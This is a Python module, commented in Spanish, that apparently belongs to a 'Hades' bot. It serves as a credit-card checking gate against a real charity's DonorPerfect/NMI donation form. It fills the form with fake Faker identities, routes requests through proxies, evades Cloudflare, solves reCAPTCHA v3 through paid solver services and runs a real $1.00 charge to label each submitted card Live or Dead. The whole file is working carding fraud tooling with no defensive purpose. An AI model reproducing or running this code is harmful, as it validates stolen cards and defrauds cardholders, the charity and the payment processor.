"""Gateway NMI $1.00 vía DonorPerfect WebLink.

Interfaz Hades:
    async def nmi_gate_check(card_data: str, user_id=None) -> {"status", "message"}

Contrato:
    - Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv.
    - Usa cargo real de USD 1.00.
    - Al usuario solo llegan textos allowlist; errores internos quedan en log.
"""
from __future__ import annotations

import asyncio
import os
import random
import re
import sys
import time
from typing import Dict, List, Optional

import requests
import cloudscraper
from faker import Faker

from bot.config import gate_proxy
from urllib.parse import parse_qs, urlparse, quote


try:
    from dotenv import load_dotenv as _load_dotenv
    _load_dotenv()
except Exception:
    pass


# ─────────────────────────────────────────────────────────────
# CONFIGURACIÓN
# ─────────────────────────────────────────────────────────────
NMI_FORM_URL = (
    "https://wl.donorperfect.net/weblink/FormSingleNM.aspx"
    "?name=E358496&id=2&formid=25"
)
NMI_STEPONE_URL = "https://wl.donorperfect.net/weblinkwebapi/api/Nmi/StepOne_ProcessSale"
NMI_RECAPTCHA_SETTINGS_URL = "https://wl.donorperfect.net/weblink/ReCaptchav3.aspx?method=settings"

ANTICAPTCHA_KEY = os.environ.get("ANTICAPTCHA_KEY", "") or os.environ.get("ANTICAPTCHA_API_KEY", "")
TWOCAPTCHA_API_KEY = os.environ.get("TWO_CAPTCHA_API_KEY", "")
NMI_DEFAULT_PROXY = os.environ.get("NMI_DEFAULT_PROXY", "")
NMI_AMOUNT = os.environ.get("NMI_AMOUNT", "1.00")
# Orden de solvers para reCAPTCHA v3: "2captcha" o "anticaptcha".
# El que falle (saldo, timeout) cae automáticamente al otro.
V3_SOLVER = os.environ.get("V3_SOLVER", "2captcha").lower()

# Modo estricto: al usuario SOLO Live/Dead/Error genéricos.
GENERIC_ERROR = "Error avisar a un administrador"
GENERIC_DECLINED = "Tarjeta declinada"
GENERIC_APPROVED = "Approved - donation processed"

# Concurrency: 1 global a la vez por ser un proceso pesado y de cargo real.
_nmi_global_sem = asyncio.Semaphore(int(os.environ.get("NMI_GLOBAL_CONCURRENCY", "1")))


# ─────────────────────────────────────────────────────────────
# UTILIDADES
# ─────────────────────────────────────────────────────────────
def _log_real(message: str) -> None:
    """Envía detalles reales solo al log del servidor, nunca al usuario."""
    print(f"[NMI REAL] {message}")


def _pick_proxy() -> Optional[Dict[str, str]]:
    url = NMI_DEFAULT_PROXY or gate_proxy("mx") or gate_proxy("rot")
    if not url:
        return None
    return {"http": url, "https": url}


def _normalize_card(card_data: str):
    try:
        original = (card_data or "").strip()
        parts = [p.strip() for p in re.split(r"\s*[|/]\s*|\s+", original)]
        if len(parts) != 4:
            return None
        pan, mes, ano, cvv = parts
        if not pan.isdigit() or len(pan) not in (15, 16):
            return None
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return None
        mm2 = mes.zfill(2)
        if not ano.isdigit():
            return None
        if len(ano) == 4:
            if not (2000 <= int(ano) <= 2099):
                return None
            yy2 = ano[-2:]
        elif len(ano) == 2:
            yy2 = ano
        else:
            return None
        cvv_low = cvv.lower()
        if cvv_low in ("rnd", "xxx", "xxxx"):
            cvv = "000"
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return None
        return pan, mm2, yy2, cvv, original
    except Exception:
        return None


def _card_type(number: str) -> str:
    return {"4": "Visa", "5": "MasterCard", "3": "AmericanExpress", "6": "Discover"}.get(number[0], "Unknown")


def _extract_hidden(html: str, name: str) -> str:
    for pat in (
        rf'<input[^>]+name="{re.escape(name)}"[^>]+value="([^"]*)"',
        rf'<input[^>]+id="{re.escape(name)}"[^>]+value="([^"]*)"',
        rf'<textarea[^>]+name="{re.escape(name)}"[^>]*>(.*?)</textarea>',
    ):
        m = re.search(pat, html, re.DOTALL | re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return ""


def _inject_aspnet_tokens(posted: Dict[str, str], html: str) -> Dict[str, str]:
    for field in ("__VIEWSTATE", "__EVENTVALIDATION", "__EVENTTARGET", "__EVENTARGUMENT", "__LASTFOCUS", "__VIEWSTATEGENERATOR"):
        val = _extract_hidden(html, field)
        if val:
            posted[field] = val
    return posted


def _extract_stepone_url(text: str) -> Optional[str]:
    """Extrae la URL del paso 3 de StepOne_ProcessSale (JSON o XML)."""
    if not text:
        return None
    # 1. Intentar JSON
    try:
        import json as _json

        body = _json.loads(text)
        if isinstance(body, dict):
            url = (body.get("Results") or "").strip()
            if url.startswith("http"):
                return url
    except Exception:
        pass
    # 2. Intentar XML: <Results>https://...</Results> y <Success>true</Success>
    m = re.search(r"<Results>(https?://[^<]+)</Results>", text, re.IGNORECASE)
    if m:
        url = m.group(1).strip()
        ok = re.search(r"<Success>(true)</Success>", text, re.IGNORECASE)
        if ok and url.startswith("http"):
            return url
    return None


def _parse_steptwo_html(html: str) -> Optional[Dict]:
    """Parsea la página NMStepTwoResponseSingle.aspx buscando el resultado.

    La página puede incluir el estado de la transacción en texto visible
    (ej. 'approved', 'declined', 'transaction id') o en campos hidden.
    Devuelve dict estilo NMI o None si no hay señal clara.
    """
    if not html:
        return None
    low = html.lower()

    # Campos hidden típicos de NMI si los hay.
    def _hidden(name: str) -> str:
        m = re.search(rf'name="{re.escape(name)}"[^>]*value="([^"]*)"', html, re.IGNORECASE)
        return m.group(1).strip() if m else ""

    code = _hidden("response_code") or _hidden("x_response_code")
    msg = _hidden("responsetext") or _hidden("x_response_reason_text")
    txn = _hidden("transactionid") or _hidden("x_trans_id")
    if code or msg:
        return {
            "approved": str(code).strip() in ("100", "101", "200", "1"),
            "code": code,
            "message": msg,
            "txn": txn,
        }

    # Señales de texto: aprobado vs declinado.
    approved_kw = ("thank you", "successfully processed", "your donation", "transaction approved", "approved")
    declined_kw = ("declined", "was not approved", "transaction failed", "error processing", "card was declined", "do not honor")

    has_approved = any(k in low for k in approved_kw)
    has_declined = any(k in low for k in declined_kw)
    if has_approved and not has_declined:
        m = re.search(r"transaction\s*(id|#|number)?\s*[:#]?\s*([a-z0-9\-]{4,40})", low)
        return {"approved": True, "code": "100", "message": "Approved", "txn": m.group(2) if m else ""}
    if has_declined:
        m = re.search(r"(declined[^<]{0,120}|do not honor[^<]{0,80}|insufficient[^<]{0,80})", low)
        return {"approved": False, "code": "", "message": (m.group(1).strip() if m else "Declined"), "txn": txn}
    return None


def _build_redirect_params(posted: Dict[str, str]) -> str:
    out = []
    for k, v in posted.items():
        if not k or k.startswith("__") or k in ("PaymentType", "CVV2") or "_ctl" in k or not v:
            continue
        k = k.split(":", 1)[0]
        v = str(v).split("|", 1)[0]
        if k == "CardAccountNum":
            v = v[:1] + "xxxx" + v[-4:]
        if k == "TransactionAmount":
            v = v.replace("$", "")
        out.append(f"{k}={quote(str(v))}")
    return "&" + "&".join(out) if out else ""


# ─────────────────────────────────────────────────────────────
# ANTI-CAPTCHA
# ─────────────────────────────────────────────────────────────
def _create_v3_task(api_base: str, client_key: str, url: str, site_key: str, action: str) -> str:
    """Crea tarea RecaptchaV3TaskProxyless y hace polling. Protocolo idéntico en Anti-Captcha y 2Captcha."""
    create = requests.post(
        f"{api_base}/createTask",
        json={
            "clientKey": client_key,
            "task": {
                "type": "RecaptchaV3TaskProxyless",
                "websiteURL": url,
                "websiteKey": site_key,
                "pageAction": action,
                "minScore": 0.7,
            },
        },
        timeout=30,
    ).json()

    if create.get("errorId") or not create.get("taskId"):
        raise Exception(f"createTask: {create.get('errorDescription', create)}")

    for _ in range(40):
        time.sleep(4)
        r = requests.post(
            f"{api_base}/getTaskResult",
            json={"clientKey": client_key, "taskId": create["taskId"]},
            timeout=30,
        ).json()
        if r.get("status") == "ready":
            return r["solution"]["gRecaptchaResponse"]
        if r.get("status") not in ("processing", "ready"):
            raise Exception(f"status: {r.get('errorDescription', r)}")

    raise Exception("Captcha solver timeout")


def _solve_recaptcha(site_key: str, url: str, action: str) -> str:
    """Resuelve reCAPTCHA v3 con el solver configurado y fallback al otro."""
    order = ["2captcha", "anticaptcha"] if V3_SOLVER == "2captcha" else ["anticaptcha", "2captcha"]
    last_err = ""
    for solver in order:
        if solver == "2captcha":
            if not TWOCAPTCHA_API_KEY:
                _log_real("2captcha sin API key, saltando solver")
                continue
            base = "https://api.2captcha.com"
            key = TWOCAPTCHA_API_KEY
        else:
            if not ANTICAPTCHA_KEY:
                _log_real("anticaptcha sin API key, saltando solver")
                continue
            base = "https://api.anti-captcha.com"
            key = ANTICAPTCHA_KEY
        try:
            token = _create_v3_task(base, key, url, site_key, action)
            if token:
                _log_real(f"reCAPTCHA resuelto con {solver}")
                return token
        except Exception as e:
            last_err = f"{solver}: {str(e)[:150]}"
            _log_real(f"Fallo solver {last_err}")
            continue
    raise Exception(last_err or "Sin solver de captcha configurado")


# ─────────────────────────────────────────────────────────────
# FLUJO SÍNCRONO PRINCIPAL
# ─────────────────────────────────────────────────────────────
def _process_sync(card_data: str, user_id: int) -> Dict[str, str]:
    t0 = time.time()

    norm = _normalize_card(card_data)
    if norm is None:
        return {"status": "❌ Dead", "message": "Fechas Invalidas"}
    pan, mm, yy, cvv, original = norm

    fake = Faker("en_US")
    first = fake.first_name()
    last = fake.last_name()
    street = fake.street_address()
    city = "Dallas"
    state = "TX"
    zip_code = "75201"
    mail = f"{first.lower()}.{last.lower()}{random.randint(100, 999)}@gmail.com"

    model = cloudscraper.create_scraper()
    proxy = _pick_proxy()
    if proxy:
        model.proxies = proxy

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    try:
        # 1. GET formulario
        r1 = model.get(NMI_FORM_URL, headers=headers, timeout=60)
        if r1.status_code != 200:
            _log_real(f"Formulario inaccesible status={r1.status_code}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}
        low1 = r1.text.lower()
        # NOTA: "deactivated" aparece en un comentario JS del timeout
        # (var status = 2; //Active = 0, Pending = 1, Deactivated = 2)
        # aunque el formulario esté vivo. Liveness real = presencia de
        # los campos de pago ASP.NET.
        if ("cardaccountnum" not in low1) or ("__viewstate" not in low1):
            _log_real("Formulario sin campos de pago (posiblemente desactivado)")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        form = {}
        for m in re.finditer(r"<input[^>]*>", r1.text):
            tag = m.group(0)
            n = re.search(r'name="([^"]*)"', tag)
            v = re.search(r'value="([^"]*)"', tag)
            if n:
                form[n.group(1)] = v.group(1) if v else ""

        st = f"{state}|Texas|Y"
        posted: Dict[str, str] = {k: v for k, v in form.items()}
        posted.update({
            "first_name:ucTxtBox": first,
            "last_name:ucTxtBox": last,
            "address:ucTxtBox": street,
            "city:ucTxtBox": city,
            "zip:ucTxtBox": zip_code,
            "home_phone:ucPhone": "2145550100",
            "email:ucEmail": mail,
            "Cardtype:ucDDL": _card_type(pan),
            "CardAccountNum:ucNumericTxt": pan,
            "ExpirationDate:ucExpirationMonth": mm,
            "ExpirationDate:ucExpirationYear": yy,
            "CVV2:ucNumericTxt": cvv,
            "CardHolderAddress:ucTxtBox": street,
            "CardHolderCity": city,
            "CardHolderZip:ucTxtBox": zip_code,
            "CardHolderEmail:ucEmail": mail,
            "state:ucDDL": st,
            "CardHolderState:ucDDL": st,
            "Part|221|giftPledgeAmount|A|Y|giftPledgeAmount:ucGPOtherAmountTxt_6": NMI_AMOUNT,
            "Part|221|giftPledgeAmount|A|Y|giftPledgeAmount:ucOtherAmountRbl": NMI_AMOUNT,
            "amount": NMI_AMOUNT,
            "nm_amount": NMI_AMOUNT,
            "__EVENTTARGET": "btnConfirm12345",
            "__EVENTARGUMENT": "",
        })
        posted = _inject_aspnet_tokens(posted, r1.text)

        # 2. POST formulario
        r2 = model.post(NMI_FORM_URL, data=posted, headers=headers, timeout=60)
        if "button-submit-payment" not in r2.text:
            _log_real("No se llegó a confirmación de pago (button-submit-payment no encontrado)")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        m = re.search(r"__AjaxRequestVerificationToken\s*=\s*'([^']+)'", r2.text)
        ajax_token = m.group(1) if m else ""
        orderid = _extract_hidden(r2.text, "orderid")
        if not ajax_token or not orderid:
            _log_real(f"Token Ajax u orderid faltante: token={bool(ajax_token)} orderid={bool(orderid)}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        template_info = {
            "companyName": _extract_hidden(r2.text, "nm_cname"),
            "companyDb": _extract_hidden(r2.text, "nm_cdb"),
            "templateId": _extract_hidden(r2.text, "nm_tid"),
            "paymentFormId": _extract_hidden(r2.text, "nm_pfid"),
            "formName": _extract_hidden(r2.text, "nm_formname"),
        }

        cf = {
            "token": ajax_token,
            "orderid": orderid,
            "templateInfo": template_info,
            "merchantDefinedField1": _extract_hidden(r2.text, "merchant_defined_field_1") or "WebLink",
            "merchantDefinedField2": _extract_hidden(r2.text, "merchant_defined_field_2"),
            "merchantDefinedField3": _extract_hidden(r2.text, "merchant_defined_field_3"),
            "merchantDefinedField4": _extract_hidden(r2.text, "merchant_defined_field_4"),
            "merchantDefinedField5": _extract_hidden(r2.text, "merchant_defined_field_5"),
            "redirectUrlQueryStringParams": _build_redirect_params(posted),
        }

        # 3. Configuración reCAPTCHA
        r3 = model.get(NMI_RECAPTCHA_SETTINGS_URL, timeout=60)
        try:
            sett = r3.json()
        except Exception:
            _log_real(f"ReCaptchav3 settings no retornó JSON: status={r3.status_code}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        site_key = sett.get("SiteKey")
        action = sett.get("Action")
        if not site_key or not action:
            _log_real(f"SiteKey/Action faltantes: {sett}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        recaptcha_token = _solve_recaptcha(site_key, NMI_FORM_URL, action)

        sale = {
            "stepTwoInitStepThree": True,
            "templateInfo": cf["templateInfo"],
            "sale": {
                "amount": NMI_AMOUNT,
                "billing": {
                    "firstname": first,
                    "lastname": last,
                    "address1": street,
                    "address2": "",
                    "city": city,
                    "state": state,
                    "postal": zip_code,
                    "country": "",
                    "email": mail,
                    "phone": "",
                    "accountType": None,
                    "entityType": None,
                    "billingId": None,
                    "company": None,
                    "fax": None,
                },
                "customerVaultId": None,
                "addCustomer": None,
                "updateCustomer": None,
                "orderid": cf["orderid"],
                "merchantDefinedField1": cf["merchantDefinedField1"],
                "merchantDefinedField2": cf["merchantDefinedField2"],
                "merchantDefinedField3": cf["merchantDefinedField3"],
                "merchantDefinedField4": cf["merchantDefinedField4"],
                "merchantDefinedField5": cf["merchantDefinedField5"],
                "currency": "USD",
            },
            "redirectUrlQueryStringParams": cf["redirectUrlQueryStringParams"],
        }

        # 4. StepOne_ProcessSale
        # NOTA: el servidor responde XML (no JSON) aunque el request sea JSON:
        # <GenericResponseOfstring...><Success>true</Success>
        # <Results>https://secure.nmi.com/api/v2/three-step/xxx</Results>...
        three_url = None
        last_stepone_status = 0
        for _ in range(3):
            r4 = model.post(
                NMI_STEPONE_URL,
                json=sale,
                headers={
                    "Content-Type": "application/json; charset=utf-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "RequestVerificationToken": cf["token"],
                    "token": recaptcha_token,
                },
                timeout=90,
            )
            last_stepone_status = r4.status_code
            if r4.status_code in (200, 500):
                three_url = _extract_stepone_url(r4.text)
                if three_url:
                    break
            else:
                _log_real(f"StepOne status inesperado={r4.status_code} raw={r4.text[:400]}")
            time.sleep(3)

        if not three_url:
            _log_real(f"No se obtuvo three URL. Ultimo status={last_stepone_status}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        # 5. POST final NMI three-step
        # La three-step URL es de un solo uso y expira en minutos.
        # NMI puede responder: redirect 302 con query params, o HTML directo.
        res = None
        last_err = ""
        for attempt in range(3):
            try:
                r5 = model.post(
                    three_url,
                    data={
                        "type": "sale",
                        "amount": NMI_AMOUNT,
                        "billing-cc-number": pan,
                        "billing-cc-exp": mm + yy,
                        "billing-cvv": cvv,
                        "billing-firstname": first,
                        "billing-lastname": last,
                        "billing-address1": street,
                        "billing-city": city,
                        "billing-state": state,
                        "billing-zip": zip_code,
                        "billing-email": mail,
                    },
                    allow_redirects=False,
                    timeout=90,
                )
                if r5.status_code in (302, 303, 307):
                    loc = r5.headers.get("Location", "")
                    _log_real(f"three-step redirect {r5.status_code} -> {loc[:200]}")
                    if loc:
                        r5 = model.get(loc, timeout=90)
                q = {}
                try:
                    q = parse_qs(urlparse(r5.url).query)
                except Exception:
                    pass
                rcode = (q.get("response_code") or [""])[0]
                rtext = (q.get("responsetext") or [""])[0]
                txn = (q.get("transactionid") or [""])[0]
                if rcode or rtext:
                    res = {"approved": str(rcode).strip() in ("100", "101", "200"), "code": rcode, "message": rtext, "txn": txn}
                    break
                # La página NMStepTwoResponseSingle.aspx puede traer el
                # resultado en el HTML en vez de query params.
                html_res = _parse_steptwo_html(r5.text or "")
                if html_res:
                    res = html_res
                    break
                # Sin query params: puede ser HTML con el resultado o sesión inválida.
                body_low = (r5.text or "").lower()
                _log_real(
                    f"three-step intento {attempt+1}: status={r5.status_code} "
                    f"url={r5.url[:150]} len={len(r5.text or '')} "
                    f"preview={(r5.text or '')[:300]}"
                )
                if "invalid session" in body_low:
                    last_err = "Invalid Session (three-step URL expirada o reutilizada)"
                    break
                last_err = "respuesta sin response_code"
                time.sleep(3)
            except Exception as e:
                last_err = str(e)[:150]
                _log_real(f"three-step intento {attempt+1} excepción: {last_err}")
                time.sleep(3)

        if res is None:
            _log_real(f"NMI step2 falló: {last_err}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}

        elapsed = time.time() - t0
        if res["approved"]:
            return {"status": "✅ Live", "message": f"{GENERIC_APPROVED} txn={res.get('txn', '')} - {elapsed:.2f}s"}
        return {"status": "❌ Dead", "message": f"{GENERIC_DECLINED} (code={res.get('code', '')}) - {elapsed:.2f}s"}

    except Exception as e:
        _log_real(f"Excepción en flujo NMI: {type(e).__name__}: {str(e)[:200]}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}


# ─────────────────────────────────────────────────────────────
# INTERFAZ ASÍNCRONA PARA HADES
# ─────────────────────────────────────────────────────────────
async def nmi_gate_check(card_data: str, user_id: int | None = None) -> Dict[str, str]:
    """Verifica 1 tarjeta contra NMI $1.00."""
    uid = user_id if user_id is not None else 0
    norm = _normalize_card(card_data)
    if norm is None:
        return {"status": "❌ Dead", "message": "Fechas Invalidas"}

    async with _nmi_global_sem:
        loop = asyncio.get_event_loop()
        try:
            return await loop.run_in_executor(None, _process_sync, card_data, uid)
        except Exception as e:
            _log_real(f"Executor error: {type(e).__name__}: {str(e)[:200]}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}
